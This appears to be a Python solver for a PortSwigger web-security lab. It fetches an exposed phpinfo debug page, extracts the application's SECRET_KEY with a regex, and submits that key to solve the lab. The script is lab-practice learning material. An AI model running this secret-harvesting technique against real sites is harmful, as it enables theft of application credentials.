# Information disclosure on debug page

# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_secret_key(s, url):
	debug_path = '/cgi-bin/phpinfo.php'
	print('\n[+] Navigating to phpinfo.php debug page: \t%s' % debug_path)
	r = s.get(url + debug_path)
	secret_key = re.search(r'SECRET_KEY </td><td class="v">(.*) </td>', r.text).group(1)
	print('[+] Found Application Secret key:\t\t%s' % secret_key)
	return secret_key

def submit_secret_key(s, url, secret_key):
	print('[+] Trying to submit the secret_key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": secret_key}
	r = s.post(submit_path, data=submit_data)
	time.sleep(1)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Information disclosure on debug page')
	parser = argparse.ArgumentParser(description="[+] Lab: Information disclosure on debug page")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to retrieve the secret_key of the framework...\n')
			time.sleep(1)
			secret_key = get_secret_key(s, url)
			r = submit_secret_key(s, url, secret_key)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
